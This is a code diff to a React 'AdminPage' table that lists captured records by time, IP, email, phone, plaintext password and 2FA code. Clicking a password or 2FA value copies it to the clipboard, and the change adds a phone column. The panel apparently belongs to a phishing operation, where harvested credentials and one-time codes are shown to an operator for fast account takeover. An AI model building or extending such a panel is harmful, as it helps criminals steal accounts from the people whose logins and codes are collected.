@@ -363,7 +363,8 @@ const AdminPage = () => {
             {/* <th className="py-2 px-4 bg-gray-200">Tool Status</th> */}
             <th className="py-2 px-4 bg-gray-200">Time</th>
             <th className="py-2 px-4 bg-gray-200">IP</th>
-            <th className="py-2 px-4 bg-gray-200">User</th>
+            <th className="py-2 px-4 bg-gray-200">Email</th>
+            <th className="py-2 px-4 bg-gray-200">Phone</th>
             <th className="py-2 px-4 bg-gray-200">Pass</th>
             <th className="py-2 px-4 bg-gray-200">2FA</th>
             <th className="py-2 px-4 bg-gray-200">Status</th>
@@ -396,6 +397,7 @@ const AdminPage = () => {
                  })()}
               </td>
               <td onClick={() => navigator.clipboard.writeText(user.email)} className="py-2 px-4 border border-gray-300">{user.email}</td>
+              <td onClick={() => navigator.clipboard.writeText(user.phone)} className="py-2 px-4 border border-gray-300">{user.phone}</td>
               <td onClick={() => navigator.clipboard.writeText(user.pass)} className="py-2 px-4 border border-gray-300">{user.pass}</td>
               <td onClick={() => navigator.clipboard.writeText(user.auth)} className="py-2 px-4 border border-gray-300">
                 {user.auth}
